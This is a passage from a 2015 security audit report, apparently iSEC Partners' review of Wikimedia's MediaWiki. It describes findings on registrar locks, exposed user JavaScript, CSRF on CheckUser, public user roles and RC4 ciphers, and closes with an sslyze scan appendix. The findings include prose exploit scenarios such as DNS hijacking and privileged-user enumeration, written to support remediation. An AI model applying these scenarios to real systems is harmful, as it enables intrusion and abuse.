hosts. the following listing displays the whois records for wikipedia.org. it has been stripped out of the contact information. visit http://www.whois.com/whois/wikipedia.org to query up-to-date records. domain status : clientdeleteprohibited domain status : clienttransferprohibited domain status : clientupdateprohibited name server :ns0 .wikimedia .org name server :ns1 .wikimedia .org name server :ns2 .wikimedia .org dnssec :unsigned listing 5: whois records for wikipedia.org. exploit scenario: an attacker finds a vulnerability on wmf's registrar and is able to comprise it. the attacker modifies the dns records of all wmf domains and subdomains and redirects all traffic to their own servers. because emails are relying on the dns records, internal wmf communications are also sabotaged, which slows down investigation of the issue. short term solution: add a registry lock on all wmf domains by adding the following dns flags: domain status : serverdeleteprohibited domain status : servertransferprohibited domain status : serverupdateprohibited listing 6: missing flags. long term solution: consider setting up a backup communication channel that does not depend on wmf domains to avoid interruption in the event of a failure or compromise of the dns infrastruc- ture of wmf. 7http://blog.cloudflare.com/details-behind-todays-internet-hacks/ february 13, 2015 wikimedia foundation version 1.1isec partners final report - wikimedia foundation mediawiki page 27 of 34 11. users can inspect each other's personal javascript class: data exposure severity: low difficulty: low finding id: isec-wmf1214-7 targets: the following pages: * http://devwiki/w/index.php?title=user:admin/common.js * http://devwiki/w/load.php?debug=false&lang=en&modules=user&only=scripts&skin=vector&user= admin * http://devwiki/wiki/user:admin/(skinname).js description: mediawiki allows users to upload custom javascript and css to alter the interface and functionality of the system. this code is stored as a wiki page, and is visible to any user of the system. exploit scenario: a user uploads javascript containing personal information that may de-anonymize that user. while the contents of this script are not part of the main indexed website, another user changes the username in one of the above urls to view the victim's custom code, learning information that may be used to identify the owner of the custom code. short term solution: treat custom script the same as other user preferences by disallowing users from examining these customizations unless they are associated with the logged in account. long term solution:the custom javascript system has two security flaws (seefinding 8 on page 24). consider deprecating this functionality and allowing users to customize the site using client-side code instead. february 13, 2015 wikimedia foundation version 1.1isec partners final report - wikimedia foundation mediawiki page 28 of 34 12. check user page lacks cross site request forgery (csrf) protection class: data validation severity: low difficulty: medium finding id: isec-wmf1214-6 targets: the check user page located at http://devwiki/wiki/special:checkuser. description: the process to check a corresponding username to ip address and vice versa lacks csrf protection. csrf attacks are perpetrated by issuing a request to a protected resource within a web application on behalf of a user without their knowledge. when the server receives the requests, it has no way of distinguishing the forged request from a request sent purposefully by the user. any user with basic rights on mediawiki can trick a user with check user rights into submitting multiple look up requests. this will fill the check user log with untrustworthy data. exploit scenario: an attacker with basic user rights on mediawiki makes targeted attacks towards mediawiki users with check user rights. a user with check user rights is tricked into visiting a site the attacker controls, in turn tricking their browser into sending the request that submits unnecessary check user requests. although the attacker cannot view the responses, a large number of unnecessary requests can damage the reputation of the valid user. short term solution:require a valid wpedittoken to be submitted with each check user request. long term solution: ensure that this wpedittoken is included with all state-changing requests site-wide. additionally, update the api such that if this token is not present, the user cannot make any state changing requests. february 13, 2015 wikimedia foundation version 1.1isec partners final report - wikimedia foundation mediawiki page 29 of 34 13. user access roles are public class: data exposure severity: informational difficulty: low finding id: isec-wmf1214-12 targets: the following pages: * http://devwiki/codwiki/index.php/special:activeusers * http://devwiki/codwiki/index.php/special:globalusers * http://devwiki/codwiki/index.php/special:centralauth description: the target links allow unauthenticated users to look up privileges associated with roles, and the role associated with any existing user. the roles, such as ``administrator'' or ``steward'' , disclose the list of operations a specific user has permission to perform. an attacker can use this information to enumerate users with higher privileges and create targeted attacks against them. short term solution:do not show the user roles in the list of users to unauthenticated users while displaying the list of users. restrict the global account information to the privileged users only . long term solution: make a chart of what parts of user accounts are considered private or pro- tected, and go through each way of accessing user data and make sure it conforms to specifications. perform regression checks to verify that there is no information disclosure which can be useful to the attacker. february 13, 2015 wikimedia foundation version 1.1isec partners final report - wikimedia foundation mediawiki page 30 of 34 14. rc4 cipher enabled class: configuration severity: informational difficulty: high finding id: isec-wmf1214-4 targets: the tls configuration of wmf servers, such as https://www.mediawiki.org. description: the rc4-sha cipher is enabled in the ssl/tls configuration of wmf's servers. rc4 is a stream cipher that is often preferred by tls servers due to its speed; however, security researchers recently demonstrated that this cipher is not suitable to guarantee message confidentiality . the rc4 cipher is flawed in its generation of a pseudo-random stream of bytes so that a wide variety of small biases are introduced into the stream, decreasing its randomness thus creating potential for plain text recovery attacks. an advisory from the ietf, 8 released october 2013, has noted that recent improve- ments in the attack vectors on rc4 mean that they are on the verge of becoming practically exploitable. as such, the ietf advises that rc4 can no longer be seen as providing sufficient levels of security for tls sessions. the advisory goes on to require that tls clients and servers never negotiate the use of rc4 cipher suites. because of the deficiencies noted, the ietf advisory, referenced below, states that: * tls clients must not include rc4 cipher suites in the clienthello message. * tls servers must not select an rc4 cipher suite when a tls client sends such a cipher suite in the clienthello message. note: in march 2013, there were new attack scenarios proposed that use statistical biases in the rc4 key table to recover plaintext with a large number of tls encryptions. 9 the output from the sslyze scan isec used to determine the targets' tls configuration can be found in appendix a.1 on the next page . short term solution:remove rc4 from production environments. update the ssl/tls configura- tion to only allow cryptographically strong cipher suites. refer tohttps://wiki.mozilla.org/security/ server_side_tls for the latest recommended cipher suite configurations. this list should prefer cipher suites that provide perfect forward secrecy, such as those using elliptic curve diffie-hellman (ecdhe). long term solution: stay abreast of security community news, such that new ssl/tls attacks or configuration weaknesses can be immediately patched or remedied. regularly check web server ssl/tls configuration using tools like sslyze10 or ssllabs.11 keep cipher suite configurations current with the latest recommended configurations found on the mozilla wiki. 12 8http://tools.ietf.org/html/draft-popov-tls-prohibiting-rc4-01 9http://home.hiroshima-u.ac.jp/ohigashi/rc4/ 10https://github.com/nabla-c0d3/sslyze/releases 11https://www.ssllabs.com/ssltest/ 12https://wiki.mozilla.org/security/server_side_tls#recommended_configurations february 13, 2015 wikimedia foundation version 1.1isec partners final report - wikimedia foundation mediawiki page 31 of 34 appendices a web application testing a.1 ssl/tls configuration testing sslyze is a command-line tool that interrogates a server to determine its ssl/tls configuration details. below is the sslyze scan output for www.mediawiki.org. the important thing to note is that the server's configuration supports rc4-based encryption. rc4-based cipher suites have been deprecated due to cryptographic flaws and should hence be re- moved. see finding 14 on the preceding page for more details. root@kali :~# sslyze -- regular www .mediawiki .org registering available plugins ----------------------------- plugincertinfo pluginsessionresumption pluginsessionrenegotiation plugincompression pluginopensslciphersuites checking host (s) availability ----------------------------- www .mediawiki .org :443 => 208.80.154.224:443 scan results for www .mediawiki .org :443 - 208.80.154.224:443 ----------------------------------------------------------- * compression : compression support : disabled * certificate : validation w/ mozilla 's ca store : certificate is trusted hostname validation : ok - subject alternative name matches sha1 fingerprint : fd0c0f015ae0b66aacefe7f6ad46c88f764365fd common name : *. wikipedia .org issuer : / c=be/o=globalsign nv -sa/cn=globalsign organization validation ca - sha256 - g2 serial number : 1121972 e32a5e5b2e29d472dfedb72d6276e not before : dec 16 21:24:03 2014 gmt not after : feb 19 12:00:00 2017 gmt signature algorithm : sha256withrsaencryption key size : 2048 x509v3 subject alternative name : dns :*. wikipedia .org , dns :*. mediawiki .org , dns :*. wikibooks .org , dns :*. wikidata .org , dns :*. wikimedia .org , dns :*. wikimediafoundation .org , dns :*. wikinews .org , dns :*. wikiquote .org , dns :*. wikisource .org , dns :*. wikiversity .org , dns :*. wikivoyage .org , dns :*. wiktionary .org , dns :*. m.mediawiki .org , dns :*. m.wikipedia .org , dns :*. m. wikibooks .org , dns :*. m.wikidata .org , dns :*. m.wikimedia .org , dns :*. m. february 13, 2015 wikimedia foundation version 1.1isec partners final report - wikimedia foundation mediawiki page 32 of 34 wikimediafoundation .org , dns :*. m.wikinews .org , dns :*. m.wikiquote .org , dns :*. m.wikisource .org , dns :*. m.wikiversity .org , dns :*. m.wikivoyage .org , dns :*. m.wiktionary .org , dns :*. zero .wikipedia .org , dns :mediawiki .org , dns : wikibooks .org , dns :wikidata .org , dns :wikimedia .org , dns :wikimediafoundation .org , dns :wikinews .org , dns :wikiquote .org , dns :wikisource .org , dns : wikiversity .org , dns :wikivoyage .org , dns :wiktionary .org , dns :wikipedia .org * session renegotiation : client -initiated renegotiations : rejected secure renegotiation : supported unhandled exception when processing -- sslv2 : utils .ctssl .errors .ctsslfeaturenotavailable - sslv2 disabled . * session resumption : with session ids : supported (5 successful , 0 failed , 0 errors , 5 total attempts ). with tls session tickets : supported * tlsv1_1 cipher suites : rejected cipher suite (s): hidden preferred cipher suite : ecdhe -rsa -aes128 -sha 128 bits http 301 moved permanently - https :// www .mediawiki .org /wiki /mediawiki accepted cipher suite (s): ecdhe -rsa -aes256 -sha 256 bits http 301 moved permanently - https :// www .mediawiki .org /wiki /mediawiki camellia256 -sha 256 bits http 301 moved permanently - https :// www .mediawiki .org /wiki /mediawiki aes256 -sha 256 bits http 301 moved permanently - https :// www .mediawiki .org /wiki /mediawiki rc4-sha 128 bits http 301 moved permanently - https :// www .mediawiki .org /wiki /mediawiki ecdhe-rsa-rc4-sha 128 bits http 301 moved permanently - https :// www .mediawiki .org /wiki /mediawiki ecdhe -rsa -aes128 -sha 128 bits http 301 moved permanently - https :// www .mediawiki .org /wiki /mediawiki camellia128 -sha 128 bits http 301 moved permanently - https :// www .mediawiki .org /wiki /mediawiki aes128 -sha 128 bits http 301 moved permanently - https :// www .mediawiki .org /wiki /mediawiki unknown errors : none * tlsv1 cipher suites : rejected cipher suite (s): hidden preferred cipher suite : ecdhe -rsa -aes128 -sha 128 bits http 301 moved permanently - https :// www .mediawiki .org /wiki /mediawiki accepted cipher suite (s): ecdhe -rsa -aes256 -sha 256 bits http 301 moved permanently - https :// www .mediawiki .org /wiki /mediawiki camellia256 -sha 256 bits http 301 moved permanently - https :// www .mediawiki .org /wiki /mediawiki aes256 -sha 256 bits http 301 moved permanently - https :// www .mediawiki .org /wiki /mediawiki rc4-sha 128 bits http 301 moved permanently - https :// february 13, 2015 wikimedia foundation version 1.1isec partners final report - wikimedia foundation mediawiki page 33 of 34 www .mediawiki .org /wiki /mediawiki ecdhe-rsa-rc4-sha 128 bits http 301 moved permanently - https :// www .mediawiki .org /wiki /mediawiki ecdhe -rsa -aes128 -sha 128 bits http 301 moved permanently - https :// www .mediawiki .org /wiki /mediawiki camellia128 -sha 128 bits http 301 moved permanently - https :// www .mediawiki .org /wiki /mediawiki aes128 -sha 128 bits http 301 moved permanently - https :// www .mediawiki .org /wiki /mediawiki unknown errors : none * sslv3 cipher suites : rejected cipher suite (s): hidden preferred cipher suite : none accepted cipher suite (s): none unknown errors : none * tlsv1_2 cipher suites : rejected cipher suite (s): hidden preferred cipher suite : ecdhe -rsa -aes128 -gcm -sha256128 bits http 301 moved permanently - https :// www .mediawiki .org /wiki /mediawiki accepted cipher suite (s): ecdhe -rsa -aes256 -sha384 256 bits http 301 moved permanently - https :// www .mediawiki .org /wiki /mediawiki ecdhe -rsa -aes256 -sha 256 bits http 301 moved permanently - https :// www .mediawiki .org /wiki /mediawiki ecdhe -rsa -aes256 -gcm -sha384256 bits http 301 moved permanently - https :// www .mediawiki .org /wiki /mediawiki camellia256 -sha 256 bits http 301 moved permanently - https :// www .mediawiki .org /wiki /mediawiki aes256 -sha256 256 bits http 301 moved permanently - https :// www .mediawiki .org /wiki /mediawiki aes256 -sha 256 bits http 301 moved permanently - https :// www .mediawiki .org /wiki /mediawiki aes256 -gcm -sha384 256 bits http 301 moved permanently - https :// www .mediawiki .org /wiki /mediawiki rc4-sha 128 bits http 301 moved permanently - https :// www .mediawiki .org /wiki /mediawiki ecdhe-rsa-rc4-sha 128 bits http 301 moved permanently - https :// www .mediawiki .org /wiki /mediawiki ecdhe -rsa -aes128 -sha256 128 bits http 301 moved permanently - https :// www .mediawiki .org /wiki /mediawiki ecdhe -rsa -aes128 -sha 128 bits http 301 moved permanently - https :// www .mediawiki .org /wiki /mediawiki ecdhe -rsa -aes128 -gcm -sha256128 bits http 301 moved permanently - https :// www .mediawiki .org /wiki /mediawiki camellia128 -sha 128 bits http 301 moved permanently - https :// www .mediawiki .org /wiki /mediawiki aes128 -sha256 128 bits http 301 moved permanently - https :// www .mediawiki .org /wiki /mediawiki aes128 -sha 128 bits http 301 moved permanently - https :// www .mediawiki .org /wiki /mediawiki aes128 -gcm -sha256 128 bits http 301 moved permanently - https :// www .mediawiki .org /wiki /mediawiki february 13, 2015 wikimedia foundation version 1.1isec partners final report - wikimedia foundation mediawiki page 34 of 34 unknown errors : none scan completed in 5.98 s ------------------------ listing 7: sslyze scan output for www .mediawiki.org february 13, 2015 wikimedia foundation version 1.1